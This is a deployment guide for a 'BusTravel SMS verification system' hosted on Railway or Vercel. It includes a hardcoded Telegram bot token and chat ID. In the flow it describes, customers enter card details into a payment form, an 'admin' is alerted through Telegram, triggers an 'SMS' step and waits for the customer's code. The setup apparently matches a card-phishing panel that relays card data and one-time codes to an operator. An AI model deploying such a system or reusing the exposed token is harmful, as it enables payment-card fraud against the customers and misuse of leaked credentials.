# 🚀 Production Deployment Guide

## Quick Deploy to Railway

### 1. Push to GitHub
```bash
git add .
git commit -m "Production-ready SMS verification system"
git push
```

### 2. Deploy to Railway
1. Go to [railway.app](https://railway.app)
2. Connect your GitHub repository
3. Railway will auto-deploy using `Procfile`

### 3. Environment Variables
Set these in Railway dashboard:
```
NODE_ENV=production
BOT_TOKEN=7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo
CHAT_ID=2063086506
PORT=3001
```

### 4. Get Your Domain
Railway will give you a URL like: `https://busTravel-production-abc.up.railway.app`

### 5. Webhook Auto-Setup
The webhook will be set automatically when the server starts in production!

---

## Alternative: Vercel Deploy

### 1. Install Vercel CLI
```bash
npm i -g vercel
```

### 2. Deploy
```bash
vercel --prod
```

### 3. Set Environment Variables
```bash
vercel env add NODE_ENV production
vercel env add BOT_TOKEN 7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo
vercel env add CHAT_ID 2063086506
```

---

## How It Works in Production

### 🔄 Complete Flow:
1. **Client** visits your Railway/Vercel URL
2. **Fills payment form** and clicks "Pay"
3. **System sends** Telegram notification with buttons
4. **Admin clicks** "📱 Отправить SMS" in Telegram
5. **Client sees** SMS input modal with real-time updates
6. **After entering** correct code → payment completes

### 📡 Technical Details:
- **Auto CORS setup** for your domain
- **Auto webhook** registration on startup
- **SSE** (Server-Sent Events) for real-time updates
- **Session cleanup** every 5 minutes
- **Environment detection** for dev/prod

### 🛡️ Security Features:
- **CORS** protection
- **Session expiration** (30 minutes)
- **Input validation**
- **Error handling**
- **Rate limiting** ready

### 📊 Monitoring:
- Health check: `https://your-domain.com/health`
- Shows active sessions count
- Environment status
- Webhook status

---

## 🧪 Testing in Production

### 1. Health Check
```bash
curl https://your-domain.com/health
```

### 2. Test Payment Flow
1. Go to payment page
2. Use test card: `4532123456789012`
3. Check Telegram for notification
4. Click "📱 Отправить SMS"
5. Enter the 6-digit code shown in Telegram

### 3. Check Webhook Status
```bash
curl "https://api.telegram.org/bot7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo/getWebhookInfo"
```

---

## 🐛 Troubleshooting

### Webhook not receiving messages
1. Check Railway/Vercel logs
2. Verify webhook URL in Telegram
3. Test with `/webhook` endpoint

### SSE connection issues
1. Check CORS headers
2. Verify domain in corsOptions
3. Check browser console for errors

### SMS modal not working
1. Ensure scripts are loaded (v14, v2)
2. Check API endpoints are accessible
3. Verify server is running

---

## 🎉 Success Indicators

✅ Railway/Vercel deployment successful  
✅ Webhook auto-configured in Telegram  
✅ Health check returns 200 OK  
✅ Payment flow works end-to-end  
✅ SMS verification completes  
✅ Real-time updates working  

**Your BusTravel SMS system is now production-ready! 🚀**